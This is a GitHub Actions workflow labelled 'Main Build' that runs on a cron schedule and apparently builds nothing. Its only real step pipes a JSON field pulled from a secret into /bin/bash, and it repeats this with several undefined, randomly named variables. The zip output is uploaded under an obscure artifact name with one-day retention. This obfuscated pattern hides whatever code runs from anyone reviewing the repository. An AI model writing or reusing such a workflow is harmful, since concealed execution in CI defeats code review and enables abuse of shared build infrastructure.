name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '18 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Start
        env:
          cvw6: ${{ secrets.cvw6 }}
        run: |
          printf '%s' "$cvw6" | jq -r .dhx633 | /bin/bash
          printf '%s' "$bqd1" | jq -r .npyf7 | /bin/bash
          echo $kbld25 | jq -r .i7218 | /bin/bash
          printf '%s' "$ycotg7" | jq -r .hbpg0 | /bin/bash
          printf '%s' "$uug90532" | jq -r .kxgsi7616 | /bin/bash
          echo $uas9738 | jq -r .kw90 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: S7gBzjK6
          path: "*.zip"
          retention-days: 1
